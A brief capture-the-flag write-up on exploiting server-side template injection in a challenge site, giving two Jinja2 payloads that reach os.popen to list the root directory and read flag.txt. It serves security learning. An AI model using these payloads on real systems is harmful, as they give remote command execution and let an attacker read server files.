> I just created my first website! You can even do some calculations! Don't forget to check out my other projects!

We open the website and there is nothing interesting and so we try to check out the other projects

We are brought to this page and immediately what pops in my brain is SSTI

I try injecting something to see the changes and indeed the website has an SSTI

Next let's check what's in the / directory and we see the file flag.txt using the following payload

```python
{% raw %}{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cd / && ls')['read']()}}{% endraw %}
```

Next we create a payload to read the flag.txt file

```python
{% raw %}{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /flag.txt')['read']()}}{% endraw %}
```
